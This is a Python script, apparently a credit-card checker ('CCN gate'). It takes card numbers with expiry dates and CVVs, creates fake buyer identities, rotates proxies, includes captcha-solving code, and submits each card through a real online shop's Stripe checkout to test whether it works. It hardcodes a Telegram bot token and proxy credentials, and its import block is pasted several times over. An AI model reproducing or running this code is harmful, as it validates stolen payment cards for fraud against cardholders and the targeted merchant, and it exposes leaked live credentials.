import email
from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper

from curl_cffi import requests
from fake_useragent import UserAgent
TOKEN_ID = "5351340320:AAHobdGvFVxLLbaVHrc4frZvY2alDfd_6nM"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TOKEN_ID}/sendMessage"


from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, filters, CallbackContext,Application,ContextTypes
import logging


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
    
def generar_numero_usa():
    area_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    central_office_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    line_number = random.randint(1000, 9999)  # XXXX
    
    return f"({area_code})-{central_office_code}-{line_number}"

def print_all_texts(data):
    if isinstance(data, dict):
        # Si existe una clave 'value' que contiene una lista
        if "value" in data and isinstance(data["value"], list):
            for value_item in data["value"]:
                if isinstance(value_item, dict) and "text" in value_item:
                    print(value_item["text"])
        # Continuar buscando en otros niveles
        for key, value in data.items():
            print_all_texts(value)

    elif isinstance(data, list):
        for item in data:
            print_all_texts(item)


def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            #c.proxies = {"https": "http://rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-mx@geo.iproyal.com:12321"}
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 4 and ano_number.startswith("20"):
                ano_number = ano_number[2:]
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            headers = {
                'authority': 'www.ticktime.store',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'client_id=1743051704668442; _c_id=1743051704668147383; sw_session=67e4dbb8d292b; store_locale=en-US; _cfuvid=nzPIMSQvoLlminK_lMow6PMGJvcLGrHo9aKrxUilN_U-1743051704892-0.0.1.1-604800000; ss_id_a_p=1743051703986352; session_id=1743051703986352; shoplazza_source=%7B%22%24first_visit_url%22%3A%22https%3A%2F%2Fwww.ticktime.store%2Fpages%2Fpayments%3Fsrsltid%3DAfmBOoq8bVbyOmtpyHtEpgY3jw3FSMatR7CV5srdBbseGUqkFFzKlmRC%22%2C%22%24latest_referrer_host%22%3A%22Google%22%2C%22expire%22%3A1743656503987%7D; last_land_url=https%3A%2F%2Fwww.ticktime.store%2Fpages%2Fpayments%3Fsrsltid%3DAfmBOoq8bVbyOmtpyHtEpgY3jw3FSMatR7CV5srdBbseGUqkFFzKlmRC; last_template_name=page; latest_referrer=https%3A%2F%2Fwww.google.com%2F; _gcl_au=1.1.74280633.1743051705; _identity_cart=8cfba914-c1b5-4313-83bf-0352b9263016; _mtid=14alvimb301; _gid=GA1.2.873057581.1743051705; _identity_popups_bundle=35bcc351-fb8c-4624-964a-e0b89a7975231743051708; _identity_popups=c1a7ac44-d8d5-4ec1-bb72-af9ecade9fcf1743051708; checkout_locale=es-ES; awesomefrontcookie=4e76a35738f1a3f843a97de04e6ff4cb; __cf_bm=XVQ15oCEVLhf9XYr1lDHtQUrUFDSD4Im_2UAWM6.3.I-1743051724-1.0.1.1-YwNZ6bKQGM.iaVXBsFOlczDD8.URiZTxLD1yV5.P.BdCQ6vahOazQDq5LWlWMXx80cjL.BE_jVFkIVLvzxQkYl_ug2qr0tNxV0z9_NuLl4OCnieh3MdyqPLE.H5UmPFZ; page_time=169; _mt_login_status=1; __stripe_mid=080944e0-4417-4aed-a304-6c93359c7b8ad2ad80; __stripe_sid=30c55c1b-9dbf-48cf-9905-e5e50f356e2d7e151f; _gat_gtag_UA_185103810_1=1; CSRF-TOKEN=UHDwGBCJcJBd3UPrvpA7DzjeF9JZLIjrT%2FaemQIwL9mX1z9P01YGsP2%2FIPFMlcs9g11hgA1ZXxxhvoUbqi6VTw%3D%3D; checkout_token=%7B%22keys%22%3A%5B%7B%22source_id%22%3A%2288497-TK200005422%22%2C%22checkout_token%22%3A%22ae1de1d7bfa946d843920eca4180eb%22%2C%22updated_at%22%3A%221743052083%22%7D%5D%7D; page_render_time=179; _ga=GA1.2.2113997164.1743051705; _ga_FLQ5SBQQTX=GS1.1.1743051704.1.1.1743052090.27.0.0; gate_time=28',
                'origin': 'https://www.ticktime.store',
                'pragma': 'no-cache',
                'referer': 'https://www.ticktime.store/collections/featured-by-ticktime/products/ticktime-cube',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-csrf-token': 'UHDwGBCJcJBd3UPrvpA7DzjeF9JZLIjrT/aemQIwL9mX1z9P01YGsP2/IPFMlcs9g11hgA1ZXxxhvoUbqi6VTw==',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'product_id': '89cd2ca3-9a9c-48bf-9eed-beac815c28b8',
                'variant_id': '8f4da90d-479c-4f10-87a3-6dfccc06ec22',
                'quantity': '1',
            }

            response = c.post('https://www.ticktime.store/api/cart', headers=headers, data=data)
            
            

            headers = {
                'authority': 'www.ticktime.store',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                # 'cookie': 'client_id=1743052379022348; _c_id=1743052379022390195; sw_session=67e4de5b34ed9; store_locale=en-US; page_render_time=175; page_time=196; __cf_bm=tpni0ZXhNFQ3VCFTkcNb869bD.gKotvorNEklthqNl8-1743052379-1.0.1.1-q4VmA9LPCytElyvZztCqp3CtuyxZnUVDAI5vNG2tZG5dklOsuRbRSVrGQ0M0ke1ByUEwd6UOamA0ZEKYSuqrf2JvYOhIGswi53toau0PNU4; _cfuvid=XXsRTJGKC_d50aO5P09JAz.nJRI3hAuHk4iJFJy.cxM-1743052379252-0.0.1.1-604800000; ss_id_a_p=1743052378339484; session_id=1743052378339484; shoplazza_source=%7B%22%24first_visit_url%22%3A%22https%3A%2F%2Fwww.ticktime.store%2Fcollections%2Ffeatured-by-ticktime%2Fproducts%2Fticktime-cube%22%2C%22%24latest_referrer_host%22%3A%22%22%2C%22expire%22%3A1743657178340%7D; last_land_url=https%3A%2F%2Fwww.ticktime.store%2Fcollections%2Ffeatured-by-ticktime%2Fproducts%2Fticktime-cube; last_template_name=product; _gcl_au=1.1.1492224692.1743052379; _mtid=14amk57i502; _identity_cart=14fa1067-05ab-4a44-8dbf-59047d25d8ee; _ga=GA1.2.1855904974.1743052379; _gid=GA1.2.1236957442.1743052379; _gat_gtag_UA_185103810_1=1; _identity_popups_bundle=cba25da9-071f-47bf-9a6f-001e8acc94221743052384; _identity_popups=989e61d6-2228-4991-ae17-1ddd57d66d6b1743052384; checkout_locale=es-ES; googtrans=/auto/es; googtrans=/auto/es; gate_time=176; _ga_FLQ5SBQQTX=GS1.1.1743052379.1.0.1743052399.40.0.0',
                'pragma': 'no-cache',
                'referer': 'https://www.ticktime.store/collections/featured-by-ticktime/products/ticktime-cube',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            response = c.get('https://www.ticktime.store/api/cart', headers=headers)
            headers = {
                'authority': 'www.ticktime.store',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'client_id=1743052379022348; _c_id=1743052379022390195; sw_session=67e4de5b34ed9; store_locale=en-US; page_render_time=175; page_time=196; __cf_bm=tpni0ZXhNFQ3VCFTkcNb869bD.gKotvorNEklthqNl8-1743052379-1.0.1.1-q4VmA9LPCytElyvZztCqp3CtuyxZnUVDAI5vNG2tZG5dklOsuRbRSVrGQ0M0ke1ByUEwd6UOamA0ZEKYSuqrf2JvYOhIGswi53toau0PNU4; _cfuvid=XXsRTJGKC_d50aO5P09JAz.nJRI3hAuHk4iJFJy.cxM-1743052379252-0.0.1.1-604800000; ss_id_a_p=1743052378339484; session_id=1743052378339484; shoplazza_source=%7B%22%24first_visit_url%22%3A%22https%3A%2F%2Fwww.ticktime.store%2Fcollections%2Ffeatured-by-ticktime%2Fproducts%2Fticktime-cube%22%2C%22%24latest_referrer_host%22%3A%22%22%2C%22expire%22%3A1743657178340%7D; last_land_url=https%3A%2F%2Fwww.ticktime.store%2Fcollections%2Ffeatured-by-ticktime%2Fproducts%2Fticktime-cube; last_template_name=product; _gcl_au=1.1.1492224692.1743052379; _mtid=14amk57i502; _identity_cart=14fa1067-05ab-4a44-8dbf-59047d25d8ee; _ga=GA1.2.1855904974.1743052379; _gid=GA1.2.1236957442.1743052379; _gat_gtag_UA_185103810_1=1; _identity_popups_bundle=cba25da9-071f-47bf-9a6f-001e8acc94221743052384; _identity_popups=989e61d6-2228-4991-ae17-1ddd57d66d6b1743052384; checkout_locale=es-ES; googtrans=/auto/es; googtrans=/auto/es; _ga_FLQ5SBQQTX=GS1.1.1743052379.1.0.1743052399.40.0.0; gate_time=36',
                'origin': 'https://www.ticktime.store',
                'pragma': 'no-cache',
                'referer': 'https://www.ticktime.store/collections/featured-by-ticktime/products/ticktime-cube',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'line_items[0][variant_id]': '8f4da90d-479c-4f10-87a3-6dfccc06ec22',
                'line_items[0][quantity]': '1',
                'line_items[0][note]': '',
                'line_items[0][properties]': '',
                'refer_info[source]': 'cart',
                'customer_note': '',
            }

            responseChk = c.post('https://www.ticktime.store/api/checkout/order',  headers=headers, data=data)
            soup = b(responseChk.text, 'html.parser')
            response_text = responseChk.text
            response_data = json.loads(responseChk.text)
            token = response_data.get('data', {}).get('order_token')

            if token:
                print("Token:", token)
            else:
                print("No se encontró el token.")
            

            headers = {
                'authority': 'www.ticktime.store',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                # 'cookie': 'client_id=1743052379022348; _c_id=1743052379022390195; page_render_time=175; page_time=196; _cfuvid=XXsRTJGKC_d50aO5P09JAz.nJRI3hAuHk4iJFJy.cxM-1743052379252-0.0.1.1-604800000; ss_id_a_p=1743052378339484; session_id=1743052378339484; shoplazza_source=%7B%22%24first_visit_url%22%3A%22https%3A%2F%2Fwww.ticktime.store%2Fcollections%2Ffeatured-by-ticktime%2Fproducts%2Fticktime-cube%22%2C%22%24latest_referrer_host%22%3A%22%22%2C%22expire%22%3A1743657178340%7D; _gcl_au=1.1.1492224692.1743052379; _mtid=14amk57i502; _identity_cart=14fa1067-05ab-4a44-8dbf-59047d25d8ee; _gid=GA1.2.1236957442.1743052379; _identity_popups_bundle=cba25da9-071f-47bf-9a6f-001e8acc94221743052384; _identity_popups=989e61d6-2228-4991-ae17-1ddd57d66d6b1743052384; checkout_locale=es-ES; googtrans=/auto/es; googtrans=/auto/es; _mt_login_status=1; __stripe_mid=cc988e33-8662-4488-8a5e-088781f9298333529f; __stripe_sid=86386027-97ce-4697-9001-d0b6538715ecfbf0c0; __cf_bm=doZLUay3tg297VL7wqHkJ5IgmRVBCMtlsJROPrwSpjE-1743054146-1.0.1.1-WLEDvZgPCEi3DHY4uCywadQOMRm01C0eOR9Tn80HgMPYzi_eqlpRMhgOMBZlGt02A4xt10pCeTqNpyFDgiZqHe1borS84HUu2_xP_3u.ivo; store_locale=en-US; _gat_gtag_UA_185103810_1=1; _ga=GA1.1.1855904974.1743052379; _ga_FLQ5SBQQTX=GS1.1.1743052379.1.1.1743054155.50.0.0; checkout_token=%7B%22keys%22%3A%5B%7B%22source_id%22%3A%2288497-TK200005424%22%2C%22checkout_token%22%3A%229acb98659bbadcfe631e02ff4f406a%22%2C%22updated_at%22%3A%221743054196%22%7D%5D%7D; gate_time=198',
                'origin': 'https://www.ticktime.store',
                'pragma': 'no-cache',
                'referer': 'https://www.ticktime.store/checkout/88497-TK200005424?step=contact_information',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            json_data = {
                'order_token': token,
                'card_info': {
                    'card_number': cc_number,
                    'card_date': f'{mes}/{ano_number}',
                    'card_month': mes,
                    'card_year': ano_number,
                    'card_code': cvv,
                },
                'billing_address': {
                    'id': '1f76af3c-18f1-47e6-ac2e-7112e38c388a',
                    'first_name': name,
                    'last_name': last,
                    'email': email,
                    'phone': '+1 551 698 6875',
                    'country_code': 'US',
                    'country': 'United States',
                    'area': '',
                    'address': 'street 12',
                    'address1': 'El',
                    'company': '',
                    'phone_area_code': 'US_1',
                    'latitude': '',
                    'longitude': '',
                    'source': '',
                    'tags': '',
                    'email_or_phone': '',
                    'cpf': '',
                    'id_number': '',
                    'gender': '',
                    'province': 'New York',
                    'province_code': 'US-NY',
                    'city': 'street 2',
                    'zip': '10013',
                },
                'customer_info': {
                    'email': email,
                    'phone': '+1 551 698 6875',
                    'first_name': name,
                    'last_name': last,
                    'newsletter': 1,
                    'note': '',
                    'save_address': 1,
                    'email_or_phone': 'vickiobrien7489@example.net',
                },
                'payment_line': {
                    'id': 'd99cd665-61e9-4e0d-8ce7-8dd7a8111529',
                    'name': 'stripe',
                    'desc': '',
                    'tips': '',
                    'payment_channel': 'stripe',
                    'payment_method': 'credit_card',
                    'payment_key': 'stripe',
                    'payment_provider': 'stripe',
                    'public_key': 'pk_live_sABOGPJXmMMDSVEnssw1HkQv00QS4gBJVe',
                    'sort_key': 'credit_card',
                    'status': 'open',
                    'is_active': True,
                    'support_tip': True,
                    'fe_pay': False,
                    'available': False,
                    'support_cards': [
                        '//img.staticdj.com/oss/operation/18345efd4db8552be9c72c41c27ea6e7.svg',
                        '//img.staticdj.com/oss/operation/50927f9a9805ee57dd3971a24ab13037.svg',
                        '//img.staticdj.com/oss/operation/b068c5902e07857d5251e11f8198ad80.svg',
                        '//img.staticdj.com/oss/operation/b823bc7dd65f1a58d949dfb47916e4b2.svg',
                        '//img.staticdj.com/oss/operation/3cc7bc0c09f7f0fb19581a21abd4cd53.svg',
                    ],
                    'key_cards': {
                        'ae': '//img.staticdj.com/oss/operation/18345efd4db8552be9c72c41c27ea6e7.svg',
                        'diners': '//img.staticdj.com/oss/operation/50927f9a9805ee57dd3971a24ab13037.svg',
                        'discover': '//img.staticdj.com/oss/operation/b068c5902e07857d5251e11f8198ad80.svg',
                        'mastercard': '//img.staticdj.com/oss/operation/b823bc7dd65f1a58d949dfb47916e4b2.svg',
                        'visa': '//img.staticdj.com/oss/operation/3cc7bc0c09f7f0fb19581a21abd4cd53.svg',
                    },
                    'account_info': {
                        'public_key': 'pk_live_sABOGPJXmMMDSVEnssw1HkQv00QS4gBJVe',
                    },
                    'setting': {
                        'merchant_desc': '',
                        'merchant_location': '',
                        'three_d_secure': False,
                        'tc_status': True,
                        'version': 'stripe_version_v3',
                    },
                    'instalments_enable': False,
                    'click_to_pay_enable': True,
                },
                'prices': {
                    'total_price': '34.98',
                    'subtotal_price': '29.99',
                    'shipping_price': '4.99',
                    'tax_price': '0.00',
                    'shipping_tax_total': '0.00',
                    'all_tax_total': '0.00',
                    'discount_price': '0.00',
                    'discount_sub_total': '29.99',
                    'discount_line_item_price': '0.00',
                    'discount_code_price': '0.00',
                    'discount_shipping_price': '4.99',
                    'gift_card_price': '0.00',
                    'payment_discount_total': '0.00',
                    'pre_payment_amount': '34.98',
                    'paid_total': '0.00',
                    'payment_due': '34.98',
                    'additional_total': '0.00',
                    'additional_prices': [],
                    'pre_calculate_data': [],
                    'duty_total': '0.00',
                    'total_tip_received': '0.00',
                },
                'risk_control_info': [
                    {
                        'type': 'forter',
                        'forter_token_cookie': '',
                    },
                ],
                'shipping_address': {
                    'id': '1f76af3c-18f1-47e6-ac2e-7112e38c388a',
                    'first_name': name,
                    'last_name': last,
                    'email': email,
                    'phone': '+1 551 698 6875',
                    'country_code': 'US',
                    'country': 'United States',
                    'area': '',
                    'address': 'street 001',
                    'address1': 'El',
                    'company': '',
                    'phone_area_code': 'US_1',
                    'source': '',
                    'tags': '',
                    'email_or_phone': '',
                    'gender': '',
                    'province': 'New York',
                    'province_code': 'US-NY',
                    'city': 'street 58',
                    'zip': '10013',
                    'extra_info': {},
                },
                'shipping_line': {
                    'delivery_method': 1,
                    'id': 'df717ef5-c0c0-48ec-84da-0d8d93310762',
                    'name': 'Standard Shipping',
                    'desc': '',
                    'shipping_price': '4.99',
                    'support_cod': 0,
                    'location_id': '0',
                    'plan_code': '',
                    'discount_shipping_price': '4.99',
                    'discounts': [],
                    'format_shipping_price': '',
                    'format_discount_shipping_price': '$4.99',
                },
                'use_shipping_address': '1',
                'config': {
                    'page_type': 'single',
                    'requires_shipping': True,
                    'checkout_business_type': 0,
                    'product_tax_included': False,
                    'checkout_template_type': 0,
                    'market_setting': {
                        'primary_market_lang': 'en-US',
                    },
                },
            }

            response = c.post(
                'https://www.ticktime.store/api/checkout/order/complete',
                headers=headers,
                json=json_data,
            )

            data = {
                'muid': 'cc988e33-8662-4488-8a5e-088781f9298333529f',
                'sid': '86386027-97ce-4697-9001-d0b6538715ecfbf0c0',
                'guid': '5d4cf2d9-2869-41b7-b203-fb2dac4599c0d6062c',
                'referrer': 'https://www.ticktime.store',
                'payment_user_agent': 'stripe.js/d80a055d16; stripe-js-v3/d80a055d16',
                'key': 'pk_live_sABOGPJXmMMDSVEnssw1HkQv00QS4gBJVe',
            }

            response = c.post('https://api.stripe.com/v1/radar/session', headers=headers, data=data)

            headers = {
                'authority': 'www.ticktime.store',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                # 'cookie': 'client_id=1743052379022348; _c_id=1743052379022390195; page_render_time=175; page_time=196; _cfuvid=XXsRTJGKC_d50aO5P09JAz.nJRI3hAuHk4iJFJy.cxM-1743052379252-0.0.1.1-604800000; ss_id_a_p=1743052378339484; session_id=1743052378339484; shoplazza_source=%7B%22%24first_visit_url%22%3A%22https%3A%2F%2Fwww.ticktime.store%2Fcollections%2Ffeatured-by-ticktime%2Fproducts%2Fticktime-cube%22%2C%22%24latest_referrer_host%22%3A%22%22%2C%22expire%22%3A1743657178340%7D; _gcl_au=1.1.1492224692.1743052379; _mtid=14amk57i502; _identity_cart=14fa1067-05ab-4a44-8dbf-59047d25d8ee; _gid=GA1.2.1236957442.1743052379; _identity_popups_bundle=cba25da9-071f-47bf-9a6f-001e8acc94221743052384; _identity_popups=989e61d6-2228-4991-ae17-1ddd57d66d6b1743052384; checkout_locale=es-ES; googtrans=/auto/es; googtrans=/auto/es; _mt_login_status=1; __stripe_mid=cc988e33-8662-4488-8a5e-088781f9298333529f; __stripe_sid=86386027-97ce-4697-9001-d0b6538715ecfbf0c0; __cf_bm=doZLUay3tg297VL7wqHkJ5IgmRVBCMtlsJROPrwSpjE-1743054146-1.0.1.1-WLEDvZgPCEi3DHY4uCywadQOMRm01C0eOR9Tn80HgMPYzi_eqlpRMhgOMBZlGt02A4xt10pCeTqNpyFDgiZqHe1borS84HUu2_xP_3u.ivo; store_locale=en-US; _gat_gtag_UA_185103810_1=1; _ga=GA1.1.1855904974.1743052379; checkout_token=%7B%22keys%22%3A%5B%7B%22source_id%22%3A%2288497-TK200005424%22%2C%22checkout_token%22%3A%229acb98659bbadcfe631e02ff4f406a%22%2C%22updated_at%22%3A%221743054201%22%7D%5D%7D; gate_time=362; _ga_FLQ5SBQQTX=GS1.1.1743052379.1.1.1743054200.5.0.0',
                'origin': 'https://www.ticktime.store',
                'pragma': 'no-cache',
                'referer': 'https://www.ticktime.store/checkout/88497-TK200005424?step=contact_information',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'order_token': token,
                'billing_address': {
                    'id': '1f76af3c-18f1-47e6-ac2e-7112e38c388a',
                    'first_name': name,
                    'last_name': last,
                    'email': email,
                    'phone': '+1 551 698 6875',
                    'country_code': 'US',
                    'country': 'United States',
                    'area': '',
                    'address': 'street 612',
                    'address1': 'El',
                    'company': '',
                    'phone_area_code': 'US_1',
                    'latitude': '',
                    'longitude': '',
                    'source': '',
                    'tags': '',
                    'email_or_phone': '',
                    'cpf': '',
                    'id_number': '',
                    'gender': '',
                    'province': 'New York',
                    'province_code': 'US-NY',
                    'city': 'street 85',
                    'zip': '10013',
                    'extra_info': {},
                },
                'payment_line': {
                    'id': 'd99cd665-61e9-4e0d-8ce7-8dd7a8111529',
                    'name': 'stripe',
                    'desc': '',
                    'tips': '',
                    'payment_channel': 'stripe',
                    'payment_method': 'credit_card',
                    'payment_key': 'stripe',
                    'payment_provider': 'stripe',
                    'public_key': 'pk_live_sABOGPJXmMMDSVEnssw1HkQv00QS4gBJVe',
                    'sort_key': 'credit_card',
                    'status': 'open',
                    'is_active': True,
                    'support_tip': True,
                    'fe_pay': False,
                    'available': False,
                    'support_cards': [
                        '//img.staticdj.com/oss/operation/18345efd4db8552be9c72c41c27ea6e7.svg',
                        '//img.staticdj.com/oss/operation/50927f9a9805ee57dd3971a24ab13037.svg',
                        '//img.staticdj.com/oss/operation/b068c5902e07857d5251e11f8198ad80.svg',
                        '//img.staticdj.com/oss/operation/b823bc7dd65f1a58d949dfb47916e4b2.svg',
                        '//img.staticdj.com/oss/operation/3cc7bc0c09f7f0fb19581a21abd4cd53.svg',
                    ],
                    'key_cards': {
                        'ae': '//img.staticdj.com/oss/operation/18345efd4db8552be9c72c41c27ea6e7.svg',
                        'diners': '//img.staticdj.com/oss/operation/50927f9a9805ee57dd3971a24ab13037.svg',
                        'discover': '//img.staticdj.com/oss/operation/b068c5902e07857d5251e11f8198ad80.svg',
                        'mastercard': '//img.staticdj.com/oss/operation/b823bc7dd65f1a58d949dfb47916e4b2.svg',
                        'visa': '//img.staticdj.com/oss/operation/3cc7bc0c09f7f0fb19581a21abd4cd53.svg',
                    },
                    'account_info': {
                        'public_key': 'pk_live_sABOGPJXmMMDSVEnssw1HkQv00QS4gBJVe',
                    },
                    'setting': {
                        'merchant_desc': '',
                        'merchant_location': '',
                        'three_d_secure': False,
                        'tc_status': True,
                        'version': 'stripe_version_v3',
                    },
                    'instalments_enable': False,
                    'click_to_pay_enable': True,
                },
                'risk_control_info': [
                    {
                        'type': 'forter',
                        'forter_token_cookie': '',
                    },
                ],
                'use_shipping_address': '1',
                'payment_extension': {},
                'prices': {
                    'total_price': '34.98',
                    'subtotal_price': '29.99',
                    'shipping_price': '4.99',
                    'tax_price': '0.00',
                    'shipping_tax_total': '0.00',
                    'all_tax_total': '0.00',
                    'discount_price': '0.00',
                    'discount_sub_total': '29.99',
                    'discount_line_item_price': '0.00',
                    'discount_code_price': '0.00',
                    'discount_shipping_price': '4.99',
                    'gift_card_price': '0.00',
                    'payment_discount_total': '0.00',
                    'pre_payment_amount': '34.98',
                    'paid_total': '0.00',
                    'payment_due': '34.98',
                    'additional_total': '0.00',
                    'additional_prices': [],
                    'pre_calculate_data': [],
                    'duty_total': '0.00',
                    'total_tip_received': '0.00',
                },
                'card_info': {
                    'card_number': cc_number,
                    'card_date': f'{mes}/{ano_number}',
                    'card_month': mes,
                    'card_year': ano_number,
                    'card_code': cvv,
                },
                'browser_info': {
                    'java_enabled': 0,
                    'color_depth': 24,
                    'screen_height': 1067,
                    'screen_width': 1707,
                    'time_zone_offset': 300,
                    'accept-language': 'es-ES',
                },
                'extra_info': {
                    'version': 'stripe_version_v3',
                    'risk_session': 'rse_1R79DrCqe4ZYWauStcd9i81a',
                },
                'payment_irrelevant_info': {
                    'redirect_config': {},
                },
            }

            responseChkk = c.post('https://www.ticktime.store/api/checkout/payments/pay',  headers=headers, json=json_data)
           
            soup = b(responseChkk.text, 'html.parser')
            response_text = soup.text.strip()

            try:
                # Convertir el texto a JSON
                responsePm = json.loads(response_text)

                print(responsePm)

            except json.JSONDecodeError as e:
                return(f"Error al decodificar JSON: ")

            
                                                

          

                    
            print("Status Code:", response.status_code)
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

if __name__ == "__main__":
    print(ccn_gate("5267779578269801|09|2031|487"))